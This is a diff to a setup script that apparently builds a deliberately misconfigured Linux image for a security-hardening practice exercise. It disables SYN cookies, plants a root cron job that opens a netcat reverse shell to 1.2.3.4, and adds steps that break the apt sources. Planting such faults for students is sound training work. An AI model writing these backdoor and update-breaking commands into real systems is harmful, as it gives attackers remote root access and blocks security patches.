@@ -23,6 +23,14 @@ echo "net.ipv4.tcp_syncookies=0" > /etc/sysctl.d/10-bad.conf
 echo '* * * * * root nc -e /bin/bash 1.2.3.4 4444' > /etc/cron.d/backdoor
 mkdir -p /home/santa/Music && echo "not really music" > /home/santa/Music/song.mp3
 
+# Broken apt sources (last, after our own installs): commented deb lines + deb822 "Enabled: no".
+for f in /etc/apt/sources.list /etc/apt/sources.list.d/*.list; do
+    [ -f "$f" ] && sed -i -E 's/^(deb[[:space:]])/# \1/' "$f"
+done
+for f in /etc/apt/sources.list.d/*.sources; do
+    [ -f "$f" ] && { grep -q '^Enabled:' "$f" && sed -i 's/^Enabled:.*/Enabled: no/' "$f" || sed -i '/^Types:/a Enabled: no' "$f"; }
+done
+
 cat > /tmp/cp-config.txt <<'EOF'
 ADMINS=santa
 USERS=prancer dasher cupid blitzen
